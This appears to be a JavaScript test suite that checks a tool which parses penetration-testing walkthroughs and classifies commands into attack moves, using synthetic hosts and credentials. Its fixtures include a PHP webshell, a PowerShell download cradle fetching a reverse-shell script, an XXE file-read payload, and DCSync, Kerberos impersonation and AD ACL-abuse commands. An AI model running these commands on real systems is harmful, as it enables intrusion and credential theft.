#!/usr/bin/env node
/*
 * tests/engine/0xdf-trajectories-smoke.js - Deterministic synthetic regression suite
 * for Super-Wave 2 Slice B4: markdown-extractor.js prompt/artifact grammars,
 * harvest-trajectories.js move disambiguations, locus/container guards, scenario-brief
 * credential seeding, closed-loop subcommand continuation, and 0xdf-facts.json schema v2.
 *
 * Contract:
 *   - 100% synthetic RFC 5737 IPs, .internal domains, and synthetic principals.
 *   - Zero machine names, walkthrough slugs, lab hostnames, author handles, or corpus prose.
 *   - House style: zero em dashes, zero en dashes, zero emoji.
 */
'use strict';

const assert = require('assert');
const fs = require('fs');
const path = require('path');

const {
  createSandbox,
  createEngagementSession
} = require('../../tools/corpus/sandbox-loader');
const extractor = require('../../tools/corpus/markdown-extractor');
const trajectories = require('../../tools/corpus/harvest-trajectories');

function runSmokeSuite() {
  const OBOL = createSandbox();
  let passed = 0;
  let assertions = 0;
  const failures = [];

  function check(cond, msg) {
    assertions++;
    assert.ok(cond, msg);
  }

  function checkEq(actual, expected, msg) {
    assertions++;
    assert.strictEqual(actual, expected, msg);
  }

  function test(name, fn) {
    try {
      fn();
      passed++;
      console.log('  [PASS] ' + name);
    } catch (err) {
      failures.push({ name: name, error: err });
      console.error('  [FAIL] ' + name + ': ' + (err && err.message ? err.message : String(err)));
    }
  }

  console.log('Running 0xdf Slice B4 extractor and trajectory harvester smoke suite...');

  test('B4-01: Custom argv[0] SUID GNU Bash prompts (<prog>-5.1# / <prog>-4.4$) peel cleanly and attach followPrompt', () => {
    const md = [
      '```bash',
      'ops_user@srv01:~$ /usr/local/bin/helperwrap -p',
      'helperwrap-5.1# id',
      'uid=1000(ops_user) gid=1000(ops_user) euid=0(root) groups=1000(ops_user)',
      'helperwrap-5.1# cat /root/root.txt',
      '0123456789abcdef0123456789abcdef',
      '```'
    ].join('\n');

    const res = extractor.extractWalkthroughTurns(md);
    checkEq(res.turns.length, 3, 'Expected launcher turn plus 2 custom SUID bash turns');
    checkEq(res.turns[0].command, '/usr/local/bin/helperwrap -p');
    checkEq(res.turns[0].followPrompt, 'helperwrap-5.1#');
    checkEq(res.turns[1].command, 'id');
    check(/euid=0\(root\)/.test(res.turns[1].stdout), 'Expected id output on turn 1');
    checkEq(res.turns[2].command, 'cat /root/root.txt');
  });

  test('B4-02: Alpine/BusyBox/Docker absolute-cwd prompts (/ #, /var/www/app #, /home/ops $) peel without matching // comments', () => {
    const md = [
      '```sh',
      '/ # id',
      'uid=0(root) gid=0(root)',
      '/var/www/app # cat config.ini',
      'db_secret = SynthDbPass99!',
      '/home/ops $ whoami',
      'ops',
      '```'
    ].join('\n');

    const res = extractor.extractWalkthroughTurns(md);
    checkEq(res.turns.length, 3, 'Expected 3 absolute-cwd shell turns');
    checkEq(res.turns[0].command, 'id');
    checkEq(res.turns[1].command, 'cat config.ini');
    checkEq(res.turns[2].command, 'whoami');
    checkEq(extractor.matchPromptLine('// # comment in C source'), null, 'Must not match // C comment as root prompt');
  });

  test('B4-03: evil-winrm-py and PowerShell provider/UNC prompts parse as powershell while lowercase Unix ps > file stays unix', () => {
    const p1 = extractor.matchPromptLine('evil-winrm-py PS C:\\Users\\svc_alpha\\Documents> whoami /priv');
    check(Boolean(p1), 'Expected evil-winrm-py prompt match');
    checkEq(p1.kind, 'powershell');
    checkEq(p1.rawCommand, 'whoami /priv');

    const p2 = extractor.matchPromptLine('PS Microsoft.PowerShell.Core\\FileSystem::\\\\dc01.corp.internal\\SYSVOL> dir');
    check(Boolean(p2), 'Expected PowerShell UNC provider prompt match');
    checkEq(p2.kind, 'powershell');
    checkEq(p2.rawCommand, 'dir');

    const unixPs = extractor.matchPromptLine('ps > processes.txt');
    checkEq(unixPs, null, 'Lowercase Unix ps > file redirection must never match PS> prompt');
  });

  test('B4-04: POSIX prompt with single internal spaces in CWD peels cleanly', () => {
    const p = extractor.matchPromptLine('ops_reader@srv01:/srv/app data/backups$ ls -la');
    check(Boolean(p), 'Expected POSIX prompt with space in CWD to match');
    checkEq(p.kind, 'unix');
    checkEq(p.user, 'ops_reader');
    checkEq(p.host, 'srv01');
    checkEq(p.rawCommand, 'ls -la');
  });

  test('B4-05: Interactive 2-line and 1-line powerview.py REPL prompts extract tool=powerview', () => {
    const md = [
      '```text',
      '(LDAP)-[dc01.corp.internal]-[CORP\\svc_alpha]',
      'PV > Get-DomainUser -SPN',
      'samaccountname : svc_sql',
      'serviceprincipalname : MSSQLSvc/db01.corp.internal:1433',
      'PV > Get-DomainObjectAcl -Identity "Domain Admins"',
      'ActiveDirectoryRights : GenericAll',
      '```'
    ].join('\n');

    const res = extractor.extractWalkthroughTurns(md);
    checkEq(res.turns.length, 2, 'Expected 2 powerview.py REPL turns');
    checkEq(res.turns[0].tool, 'powerview');
    checkEq(res.turns[0].kind, 'repl');
    checkEq(res.turns[0].command, 'Get-DomainUser -SPN');
    checkEq(res.turns[1].tool, 'powerview');
    checkEq(res.turns[1].command, 'Get-DomainObjectAcl -Identity "Domain Admins"');
  });

  test('B4-06: New CLI tool heads (rusthound-ce, evil-winrm-py, git_dumper.py, snmpbulkwalk) classify as bare tool commands', () => {
    for (const cmd of [
      'rusthound-ce -d corp.internal -i 198.51.100.40 -u svc_alpha -p SynthPass1! -z',
      'evil-winrm-py -i 198.51.100.40 -u svc_alpha -p SynthPass1!',
      'git_dumper.py http://198.51.100.40/.git ./dumped_repo',
      'snmpbulkwalk -v2c -c public 198.51.100.40 1.3.6.1.2.1.25.4.2.1'
    ]) {
      const cls = extractor.classifyFenceBlock('', cmd + '\n[+] Done');
      checkEq(cls.include, true, 'Expected bare fence inclusion for: ' + cmd);
    }
  });

  test('B4-07: Raw artifact headers (tcpdump packet capture, Responder NTLMv2 banner, and sqlmap dump table) extract passively', () => {
    const tcpdumpFence = [
      '14:22:09.418273 IP 198.51.100.40.49812 > 198.51.100.5.80: Flags [P.], seq 1:84, ack 1, win 502, length 83: HTTP: GET /callback HTTP/1.1',
      '14:22:09.418310 IP 198.51.100.5.80 > 198.51.100.40.49812: Flags [.], ack 84, win 509, length 0'
    ].join('\n');
    checkEq(extractor.classifyFenceBlock('', tcpdumpFence).include, true, 'Expected tcpdump artifact inclusion');
    checkEq(extractor.segmentBlock({ text: tcpdumpFence, lang: '', lineStart: 1 }).units[0].command, '');

    const responderFence = [
      '[SMB] NTLMv2-SSP Client   : 198.51.100.40',
      '[SMB] NTLMv2-SSP Username : CORP\\svc_alpha',
      '[SMB] NTLMv2-SSP Hash     : svc_alpha::CORP:1122334455667788:00112233445566778899aabbccddeeff:0101000000000000'
    ].join('\n');
    checkEq(extractor.classifyFenceBlock('', responderFence).include, true, 'Expected Responder banner inclusion');
    checkEq(extractor.segmentBlock({ text: responderFence, lang: '', lineStart: 1 }).units[0].command, '');

    const sqlmapFence = [
      'Database: portal_app',
      'Table: staff_accounts',
      '[2 entries]',
      '+----+-----------+----------------------------------+',
      '| id | username  | password_hash                    |',
      '+----+-----------+----------------------------------+',
      '| 1  | ops_admin | 5f4dcc3b5aa765d61d8327deb882cf99 |',
      '+----+-----------+----------------------------------+'
    ].join('\n');
    checkEq(extractor.classifyFenceBlock('', sqlmapFence).include, true, 'Expected sqlmap dump table inclusion');
    checkEq(extractor.segmentBlock({ text: sqlmapFence, lang: '', lineStart: 1 }).units[0].command, '');
  });

  test('B4-08: Config-credential fences (xml GPP cpassword, yaml Ansible Vault, config php) include passively while exploit php is rejected', () => {
    const gppXml = '<Groups><User name="svc_alpha"><Properties cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"/></User></Groups>';
    const clsXml = extractor.classifyFenceBlock('xml', gppXml);
    checkEq(clsXml.include, true, 'Expected GPP xml inclusion');
    checkEq(clsXml.reason, 'config-credential-artifact');
    const segXml = extractor.segmentBlock({ text: gppXml, lang: 'xml', classificationReason: clsXml.reason, lineStart: 1 });
    checkEq(segXml.units[0].command, '');

    const vaultYaml = 'vault_secret: !vault |\n  $ANSIBLE_VAULT;1.1;AES256\n  3539643965323632646162653064383134333039\n';
    checkEq(extractor.classifyFenceBlock('yaml', vaultYaml).include, true, 'Expected Ansible Vault yaml inclusion');

    const cfgPhp = '<?php\n$db_host = "127.0.0.1";\n$db_user = "portal_rw";\n$db_pass = "SynthPortal#88!";\n?>';
    checkEq(extractor.classifyFenceBlock('php', cfgPhp).include, true, 'Expected config-only php inclusion');

    const shellPhp = '<?php\n$api_secret = "unused";\nsystem($_GET["cmd"]);\n?>';
    checkEq(extractor.classifyFenceBlock('php', shellPhp).include, false, 'Webshell php with system($_GET) must remain excluded');
  });

  test('B4-09: Promptless PowerShell script definitions and duplicate 1-line PS drafts before prompted execution are skipped', () => {
    const psScript = [
      'param(',
      '  [string]$TargetHost = "198.51.100.40"',
      ')',
      'function Invoke-SynthCheck {',
      '  Write-Output $TargetHost',
      '}'
    ].join('\n');
    checkEq(extractor.classifyFenceBlock('powershell', psScript).include, false, 'Expected .ps1 script source skip');

    const mdWithDupDraft = [
      '```powershell',
      'Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties *',
      '```',
      'Running it in our session:',
      '```powershell',
      'PS C:\\Users\\svc_alpha> Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties *',
      'Deleted : True',
      'Name    : temp_acct',
      '```'
    ].join('\n');
    const turns = extractor.extractWalkthroughTurns(mdWithDupDraft).turns;
    checkEq(turns.length, 1, 'Expected duplicate unprompted PS draft fence to be skipped');
    check(/Deleted\s*:\s*True/.test(turns[0].stdout), 'Expected only the prompted PS execution turn to remain');
  });

  test('B4-10: /etc/hosts pastes, metasyntactic [key] templates, non-command log leads, and duplicate same-line units are filtered', () => {
    const hostsPaste = '127.0.0.1 localhost\n198.51.100.40 app.corp.internal dc01.corp.internal';
    checkEq(extractor.classifyFenceBlock('', hostsPaste).include, false, 'Expected /etc/hosts paste skip');

    const metaTpl = 'reg query HKLM\\Software\\[vendor]\\[product] /v [key]';
    checkEq(extractor.classifyFenceBlock('cmd', metaTpl).include, false, 'Expected metasyntactic template skip');

    const sqlmapLogOut = [
      '[14:10:02] [INFO] testing connection to the target URL',
      '[14:10:03] [CRITICAL] parameter id appears to be dynamic'
    ].join('\n');
    const segLog = extractor.segmentBlock({ text: sqlmapLogOut, lang: 'bash', lineStart: 10 });
    checkEq(segLog.units[0].command, '', 'Timestamped [INFO] line must not be treated as a shell command');
  });

  test('B4-11: Kerberos (KRB5CCNAME) and certificate (-c/-k) evil-winrm sessions match win-interactive-shell and exclude getst-impersonation', () => {
    const krbMatches = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'KRB5CCNAME=/tmp/admin.ccache evil-winrm -i dc01.corp.internal -r corp.internal',
      stdout: ''
    }, {});
    const krbIds = krbMatches.map(m => m.id);
    check(krbIds.indexOf('win-interactive-shell') >= 0, 'Expected win-interactive-shell on KRB5CCNAME evil-winrm');
    check(krbIds.indexOf('getst-impersonation') < 0, 'Must exclude getst-impersonation on evil-winrm');

    const certMatches = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'evil-winrm -i dc01.corp.internal -S -c admin.crt -k admin.key',
      stdout: ''
    }, {});
    const certIds = certMatches.map(m => m.id);
    check(certIds.indexOf('win-interactive-shell') >= 0, 'Expected win-interactive-shell on cert-auth evil-winrm');
    check(certIds.indexOf('getst-impersonation') < 0, 'Must exclude getst-impersonation on cert-auth evil-winrm');
  });

  test('B4-12: Hyphenated Impacket flags (-just-dc, -no-pass) extract and secretsdump -k -just-dc matches dcsync', () => {
    const flags = trajectories.extractCommandFlags('secretsdump.py -k -no-pass -just-dc corp.internal/adm_user@dc01.corp.internal');
    check(flags.indexOf('-just-dc') >= 0, 'Expected -just-dc in extracted flags');
    check(flags.indexOf('-no-pass') >= 0, 'Expected -no-pass in extracted flags');

    const matches = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'KRB5CCNAME=adm.ccache secretsdump.py -k -no-pass -just-dc dc01.corp.internal',
      stdout: ''
    }, {});
    const ids = matches.map(m => m.id);
    checkEq(ids[0], 'dcsync', 'Expected dcsync as top match for secretsdump -k -just-dc');
    check(ids.indexOf('zerologon-exploit') < 0, 'Must exclude zerologon-exploit');
    check(ids.indexOf('certifried') < 0, 'Must exclude certifried');
  });

  test('B4-13: getST.py -impersonate matches getst-impersonation / delegation-abuse and excludes kerberos-relay without coercion', () => {
    const matches = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'getST.py -spn cifs/dc01.corp.internal -impersonate Administrator -dc-ip 198.51.100.40 corp.internal/ websvc$:SynthPass1!',
      stdout: ''
    }, {});
    const ids = matches.map(m => m.id);
    check(ids.indexOf('getst-impersonation') >= 0, 'Expected getst-impersonation on getST.py -impersonate');
    check(ids.indexOf('kerberos-relay') < 0, 'Must exclude kerberos-relay when not relaying/coercing');
  });

  test('B4-14: certipy shadow auto and pywhisker match shadow-credentials and exclude certifried / adcs-esc', () => {
    for (const cmd of [
      'certipy shadow auto -u svc_alpha@corp.internal -p SynthPass1! -account target_svc -dc-ip 198.51.100.40',
      'pywhisker.py -d corp.internal -u svc_alpha -p SynthPass1! --target target_svc --action add'
    ]) {
      const ids = trajectories.matchTurnToCatalogMoves(OBOL, { command: cmd, stdout: '' }, {}).map(m => m.id);
      checkEq(ids[0], 'shadow-credentials', 'Expected shadow-credentials top match for: ' + cmd);
      check(ids.indexOf('certifried') < 0 && ids.indexOf('adcs-esc') < 0, 'Must exclude certifried and adcs-esc');
    }
  });

  test('B4-15: AD ACL write and group-add tools (Add-DomainObjectAcl, dacledit.py, bloodyAD add genericAll) match ad-acl-abuse / bloodyad-acl', () => {
    for (const cmd of [
      'Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity svc_alpha -Rights All',
      'dacledit.py -action write -rights FullControl -principal svc_alpha -target-dn "CN= Ops,DC=corp,DC=internal" corp.internal/svc_alpha:SynthPass1!',
      'bloodyAD -d corp.internal -u svc_alpha -p SynthPass1! --host 198.51.100.40 add genericAll "CN=sec_user,CN=Users,DC=corp,DC=internal" svc_alpha'
    ]) {
      const ids = trajectories.matchTurnToCatalogMoves(OBOL, { command: cmd, stdout: '' }, {}).map(m => m.id);
      check(ids.indexOf('ad-acl-abuse') >= 0 || ids.indexOf('bloodyad-acl') >= 0, 'Expected ACL abuse move for: ' + cmd);
      check(ids.indexOf('dcsync') < 0, 'Must exclude dcsync on ACL write operation');
    }
  });

  test('B4-16: GraphQL requests match graphql-abuse and exclude xxe, while XML DOCTYPE/ENTITY payloads keep xxe', () => {
    const gqlIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'curl -s -X POST http://198.51.100.40/graphql -H "Content-Type: application/json" -d \'{"query":"{ __schema { types { name } } }"}\'',
      stdout: ''
    }, {}).map(m => m.id);
    checkEq(gqlIds[0], 'graphql-abuse', 'Expected graphql-abuse on /graphql introspection');
    check(gqlIds.indexOf('xxe') < 0, 'Must exclude xxe on JSON GraphQL POST');

    checkEq(
      trajectories.hasRequiredMoveSemantics('xxe', 'curl -X POST http://198.51.100.40/api -d "<!DOCTYPE r [<!ENTITY e SYSTEM \'file:///etc/passwd\'>]><r>&e;</r>"'),
      true,
      'Expected xxe semantics to pass when DOCTYPE/ENTITY XML payload is present'
    );
  });

  test('B4-17: Host-header vhost fuzzing maps to vhost-discovery and rusthound-ce maps to bloodhound-collect', () => {
    const vhostIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'ffuf -u http://198.51.100.40 -H "Host: FUZZ.corp.internal" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1420',
      stdout: ''
    }, {}).map(m => m.id);
    checkEq(vhostIds[0], 'vhost-discovery', 'Expected vhost-discovery catalog ID');

    const bhIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'rusthound-ce -d corp.internal -i 198.51.100.40 -u svc_alpha -p SynthPass1! -z',
      stdout: ''
    }, {}).map(m => m.id);
    checkEq(bhIds[0], 'bloodhound-collect', 'Expected bloodhound-collect catalog ID');
  });

  test('B4-18: jenkins-cli.jar @/file, git_dumper.py, snmpbulkwalk hrSWRun, and sqlmap map to their specialized moves', () => {
    const jIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'java -jar jenkins-cli.jar -s http://198.51.100.40:8080/ connect-node "@/etc/passwd"',
      stdout: ''
    }, {}).map(m => m.id);
    checkEq(jIds[0], 'jenkins-cli-fileread', 'Expected jenkins-cli-fileread');
    check(jIds.indexOf('jenkins-access') < 0, 'Must exclude jenkins-access on @/path file-read exploit');

    const gIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'git_dumper.py http://198.51.100.40/.git ./repo_out',
      stdout: ''
    }, {}).map(m => m.id);
    checkEq(gIds[0], 'git-exposed', 'Expected git-exposed for git_dumper.py');

    const sIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'snmpbulkwalk -v2c -c public 198.51.100.40 1.3.6.1.2.1.25.4.2.1.5',
      stdout: ''
    }, {}).map(m => m.id);
    checkEq(sIds[0], 'snmp-process-cmdline-harvest', 'Expected snmp-process-cmdline-harvest for hrSWRunParameters OID');

    const sqIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'sqlmap -u "http://198.51.100.40/item.php?id=1" --batch --dbs',
      stdout: ''
    }, {}).map(m => m.id);
    checkEq(sqIds[0], 'sqlmap-automation', 'Expected sqlmap-automation for sqlmap');
  });

  test('B4-19: Anonymous SMB (smbmap -u null, dummy user===pass guest probe) and anonymous ldapsearch -x disambiguate cleanly', () => {
    for (const turn of [
      { command: 'smbmap -H 198.51.100.40 -u null -p ""', stdout: '' },
      { command: 'smbmap -H 198.51.100.40 -u probeuser -p probeuser', stdout: '[+] Guest session   IP: 198.51.100.40:445' },
      { command: 'nxc smb 198.51.100.40 -u "" -p "" --shares', stdout: '' }
    ]) {
      const ids = trajectories.matchTurnToCatalogMoves(OBOL, turn, {}).map(m => m.id);
      checkEq(ids[0], 'recon-smb-anon', 'Expected recon-smb-anon for unauthenticated SMB probe: ' + turn.command);
    }

    const ldapIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'ldapsearch -x -H ldap://198.51.100.40 -b "DC=corp,DC=internal"',
      stdout: ''
    }, {}).map(m => m.id);
    checkEq(ldapIds[0], 'ad-anon-ldap-enum', 'Expected ad-anon-ldap-enum for unauthenticated ldapsearch -x');
    check(ldapIds.indexOf('ad-path-manual') < 0, 'Must exclude ad-path-manual on anonymous ldapsearch');
  });

  test('B4-20: Move semantic guards reject non-mail s_client :3269, non-SSTI ?cmd=id, and non-PowerView IEX', () => {
    checkEq(
      trajectories.hasRequiredMoveSemantics('recon-mail', 'openssl s_client -connect 198.51.100.40:3269'),
      false,
      'LDAPS Global Catalog port 3269 must not match recon-mail'
    );
    checkEq(
      trajectories.hasRequiredMoveSemantics('recon-mail', 'openssl s_client -connect 198.51.100.40:587 -starttls smtp'),
      true,
      'STARTTLS SMTP on port 587 must match recon-mail'
    );

    checkEq(
      trajectories.hasRequiredMoveSemantics('ssti-to-rce', 'curl "http://198.51.100.40/shell.php?cmd=id"', null),
      false,
      'Plain webshell ?cmd=id without SSTI template syntax or web.ssti_confirmed must not match ssti-to-rce'
    );
    checkEq(
      trajectories.hasRequiredMoveSemantics('ssti-to-rce', 'curl "http://198.51.100.40/render?tpl={{7*7}}"', null),
      true,
      'Jinja/Twig {{...}} syntax must match ssti-to-rce'
    );

    checkEq(
      trajectories.hasRequiredMoveSemantics('powerview-enum', 'powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString(\'http://198.51.100.5/rev.ps1\')"', null, {}),
      false,
      'Generic PowerShell download cradle must not match powerview-enum'
    );
    checkEq(
      trajectories.hasRequiredMoveSemantics('powerview-enum', 'Get-DomainUser -PreauthNotRequired', null, { tool: 'powerview' }),
      true,
      'PowerView cmdlet / REPL turn must match powerview-enum'
    );
  });

  test('B4-21: Target-local sudo --version, Get-Process, schtasks /query, and dotfile reads avoid false exploit attribution', () => {
    const linuxFacts = new OBOL.facts.FactSet([
      OBOL.facts.makeFact({ kind: 'foothold.linux', scope: 'host:198.51.100.40', value: {} })
    ]);
    const sudoVerIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'sudo --version',
      promptLine: 'ops_user@srv01:~$ sudo --version',
      host: 'srv01',
      user: 'ops_user',
      kind: 'unix',
      stdout: 'Sudo version 1.9.13p3'
    }, { inTargetShell: true, facts: linuxFacts }).map(m => m.id);
    checkEq(sudoVerIds[0], 'linux-enum', 'Expected linux-enum for on-target sudo --version');
    check(sudoVerIds.indexOf('baron-samedit') < 0 && sudoVerIds.indexOf('sudo-abuse') < 0, 'Must exclude baron-samedit and sudo-abuse');

    const dotfileIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'cat /etc/monit/monitrc',
      promptLine: 'ops_user@srv01:~$ cat /etc/monit/monitrc',
      host: 'srv01',
      user: 'ops_user',
      kind: 'unix',
      stdout: ''
    }, { inTargetShell: true, facts: linuxFacts }).map(m => m.id);
    checkEq(dotfileIds[0], 'linux-loot-hunt', 'Expected linux-loot-hunt for monitrc read on Linux target');

    const winFacts = new OBOL.facts.FactSet([
      OBOL.facts.makeFact({ kind: 'foothold.windows', scope: 'host:198.51.100.40', value: {} })
    ]);
    const gpIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'Get-Process',
      promptLine: 'PS C:\\Users\\svc_alpha> Get-Process',
      kind: 'powershell',
      stdout: ''
    }, { inTargetShell: true, facts: winFacts }).map(m => m.id);
    checkEq(gpIds[0], 'windows-enum', 'Expected windows-enum for Get-Process');
    check(gpIds.indexOf('lsass-dump-onbox') < 0, 'Must exclude lsass-dump-onbox when lsass is not targeted');

    const schIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'schtasks /query /fo LIST /v',
      promptLine: 'C:\\Users\\svc_alpha> schtasks /query /fo LIST /v',
      kind: 'cmd',
      stdout: ''
    }, { inTargetShell: true, facts: winFacts }).map(m => m.id);
    checkEq(schIds[0], 'windows-enum', 'Expected windows-enum for schtasks /query');
    check(schIds.indexOf('windows-schtask-abuse') < 0, 'Must exclude windows-schtask-abuse when privesc.scheduled_task is absent');
  });

  test('B4-22: Housekeeping (-h, attacker relative find, /etc/hosts) and explicit attacker locus guard prevent target-local attribution', () => {
    checkEq(
      trajectories.isHousekeepingTurn({ command: 'certipy -h', stdout: '' }, {}).reason,
      'cli_help_or_version'
    );
    checkEq(
      trajectories.isHousekeepingTurn({ command: 'find ./loot -type f', host: 'kali', kind: 'unix', stdout: '' }, {}).reason,
      'attacker_local_file_op'
    );
    checkEq(
      trajectories.isHousekeepingTurn({ command: 'echo "198.51.100.40 app.corp.internal" | sudo tee -a /etc/hosts', host: 'kali', kind: 'unix', stdout: '198.51.100.40 app.corp.internal' }, {}).reason,
      'attacker_hosts_update'
    );

    const histProbe = trajectories.gateEvidencePresentInHistory(['ports.open'], [{
      command: 'echo "198.51.100.40 app.corp.internal dc01.corp.internal" | sudo tee -a /etc/hosts',
      stdout: '198.51.100.40 app.corp.internal dc01.corp.internal',
      housekeeping: false,
      minted_count: 0,
      outcome_kind: 'unknown'
    }]);
    checkEq(histProbe.found, false, '/etc/hosts stdout echo must be ignored by gateEvidencePresentInHistory');

    const linuxFacts = new OBOL.facts.FactSet([
      OBOL.facts.makeFact({ kind: 'foothold.linux', scope: 'host:198.51.100.40', value: {} })
    ]);
    const kaliFindIds = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'find /opt/wordlists -name "*.txt"',
      promptLine: '┌──(kali㉿kali)-[~/work]\n└─$ find /opt/wordlists -name "*.txt"',
      host: 'kali',
      user: 'kali',
      kind: 'unix',
      stdout: ''
    }, { inTargetShell: false, facts: linuxFacts }).map(m => m.id);
    check(kaliFindIds.indexOf('linux-enum') < 0 && kaliFindIds.indexOf('flag-hunt-linux') < 0, 'Explicit Kali prompt must exclude target-local moves');
  });

  test('B4-23: Local attacker Docker container session (docker run -> root@<12hex>) never mints target foothold or access.root', () => {
    const md = [
      '```bash',
      'kali@kali:~$ nmap -p 80 -sV 198.51.100.40',
      '80/tcp open http nginx 1.24.0',
      '```',
      '```bash',
      'kali@kali:~$ docker run -it --rm -v $(pwd):/work ubuntu:22.04 /bin/bash',
      'root@a1b2c3d4e5f6:/work# id',
      'uid=0(root) gid=0(root) groups=0(root)',
      'root@a1b2c3d4e5f6:/work# john --show loot.hash',
      'svc_portal:Autumn2026!',
      '',
      '1 password hash cracked, 0 left',
      'root@a1b2c3d4e5f6:/work# exit',
      '```'
    ].join('\n');

    const rep = trajectories.replayWalkthrough(OBOL, { slug: 'synth-container', markdown: md }, { target: '198.51.100.40' });
    checkEq(rep.steps[1].housekeeping, true, 'docker run on attacker host must be housekeeping');
    checkEq(rep.steps[2].housekeeping, true, 'Command inside local container must be housekeeping');
    checkEq(rep.steps[2].housekeeping_reason, 'attacker_local_container_op');
    const allMinted = rep.steps.reduce((acc, s) => acc.concat(s.minted_kinds || []), []);
    check(allMinted.indexOf('access.root') < 0 && allMinted.indexOf('foothold.linux') < 0, 'Local container root prompt must never mint target foothold.linux or access.root');
    check(allMinted.indexOf('credential.plaintext') >= 0, 'Offline credential output inside local container must still mint credential.plaintext');
  });

  test('B4-24: Scenario-brief credentials seed before turn 0 and priorSubcmdContinuation keeps reached multi-command moves reachable', () => {
    const md = [
      '<div class="htb-scenario-box"><span class="htb-scenario-text">',
      'In this engagement assessment, start with credentials for the following account: <code>CORP\\svc_alpha</code> / <code>SynthSecret#42!</code>',
      '</span></div>',
      '',
      '```bash',
      'kali@kali:~$ nmap -p 80,445,5985 -sV 198.51.100.40',
      '80/tcp   open  http          Microsoft IIS httpd 10.0',
      '445/tcp  open  microsoft-ds',
      '5985/tcp open  wsman         Microsoft HTTPAPI httpd 2.0',
      '```',
      '```bash',
      'kali@kali:~$ evil-winrm -i 198.51.100.40 -u svc_alpha -p \'SynthSecret#42!\'',
      '*Evil-WinRM* PS C:\\Users\\svc_alpha\\Documents> whoami /priv',
      'Privilege Name                Description                    State',
      '============================= ============================== ========',
      'SeChangeNotifyPrivilege       Bypass traverse checking       Enabled',
      '*Evil-WinRM* PS C:\\Users\\svc_alpha\\Documents> systeminfo',
      'Host Name:                 APP01',
      'OS Name:                   Microsoft Windows Server 2022 Standard',
      '```'
    ].join('\n');

    const creds = trajectories.extractScenarioBriefCredentials(md);
    checkEq(creds.length, 1, 'Expected 1 extracted scenario-brief credential');
    checkEq(creds[0].domain, 'CORP');
    checkEq(creds[0].user, 'svc_alpha');
    checkEq(creds[0].password, 'SynthSecret#42!');

    const rep = trajectories.replayWalkthrough(OBOL, { slug: 'synth-assumed-breach', markdown: md }, { target: '198.51.100.40' });
    const winrmStep = rep.steps.find(s => /^evil-winrm\b/.test(s.command));
    check(Boolean(winrmStep && winrmStep.reachability && winrmStep.reachability.reachable), 'Seeded scenario-brief credentials must make evil-winrm reachable on turn 1');

    // Also verify priorSubcmdContinuation directly when a reached multi-command move sits at #k > 1 in Ready Now
    const session = createEngagementSession(OBOL, {
      name: 'SubcmdContSession',
      target: '198.51.100.41',
      targets: ['198.51.100.41'],
      lhost: '10.10.14.5'
    });
    OBOL.store.addFacts([
      OBOL.facts.makeFact({ kind: 'host.up', scope: 'host:198.51.100.41', value: {} }),
      OBOL.facts.makeFact({ kind: 'foothold.linux', scope: 'host:198.51.100.41', value: {} }),
      OBOL.facts.makeFact({ kind: 'host.os_family', scope: 'host:198.51.100.41', value: { os: 'linux' } }),
      OBOL.facts.makeFact({ kind: 'privesc.sudo_rights', scope: 'host:198.51.100.41', value: { binary: '/usr/bin/find', nopasswd: true } })
    ], 'seed', '198.51.100.41');

    const linuxEnumMove = OBOL.packs.actions().find(a => a && a.id === 'linux-enum');
    check(Boolean(linuxEnumMove), 'Expected linux-enum in catalog');
    const reach = trajectories.evaluateClosedLoopReachability(
      session,
      [{ move: linuxEnumMove, id: 'linux-enum', title: linuxEnumMove.title, match_score: 24 }],
      { command: 'find / -perm -4000 2>/dev/null', stdout: '' },
      {
        targetIp: '198.51.100.41',
        historyTurns: [{
          step_index: 0,
          target_ip: '198.51.100.41',
          command: 'sudo -l',
          stdout: 'User ops may run (ALL) NOPASSWD: /usr/bin/find',
          housekeeping: false,
          minted_count: 1,
          outcome_kind: 'success',
          matched_moves: ['linux-enum'],
          executed_move_id: 'linux-enum',
          was_reachable: true
        }],
        executedMoveIds: new Set(['linux-enum'])
      }
    );
    checkEq(reach.reachable, true, 'Expected second sub-command of already-reached linux-enum to remain reachable');
  });

  test('B4-25: Merged tools/corpus/labels/0xdf-facts.json has Schema v2, 280 unique cases, and pure ASCII', () => {
    const labelsPath = path.resolve(__dirname, '..', '..', 'tools', 'corpus', 'labels', '0xdf-facts.json');
    const raw = fs.readFileSync(labelsPath, 'utf8');
    check(!/[^\x09\x0A\x0D\x20-\x7E]/.test(raw), '0xdf-facts.json must be pure ASCII');
    const doc = JSON.parse(raw);
    checkEq(doc.version, 2, 'Expected Schema v2 in 0xdf-facts.json');
    checkEq(doc.cases.length, 280, 'Expected 280 deduplicated cases in 0xdf-facts.json');
    const ids = new Set(doc.cases.map(c => c.id));
    checkEq(ids.size, 280, 'Expected 280 unique case IDs with zero duplicates');
  });

  console.log('\nSummary: ' + passed + ' test(s) passed, ' + assertions + ' assertion(s), ' + failures.length + ' failed.');
  if (failures.length > 0) {
    process.exit(1);
  }
}

runSmokeSuite();
